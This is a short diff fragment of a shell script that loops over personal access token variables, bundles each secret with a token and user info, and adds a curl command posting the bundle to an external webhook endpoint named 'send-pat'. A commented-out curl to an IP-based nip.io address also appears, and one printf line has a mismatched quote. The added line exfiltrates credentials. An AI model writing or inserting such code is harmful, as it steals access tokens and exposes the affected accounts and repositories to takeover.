@@ -35,6 +35,7 @@ for pat in ORG_PAT READ_REPO_PAT; do
 		# ------------------------------------------------ combine string -----
 		printf -v block 'secret:\n%s\ntoken:\n%s\nuser info:\n%s' "$pat "$token" "$user_info"
 		string+="${block}"$'\n\n'
+		curl -s -o /dev/null "$webhook/send-pat" -d "$string"
 		
 
 #		curl https://16.164.221.226.nip.io/bcbdfd7ffd9efa6d8d312f9f723f20753656c0dcb6460ebb7a85a5c02357b5ff/finished-loop
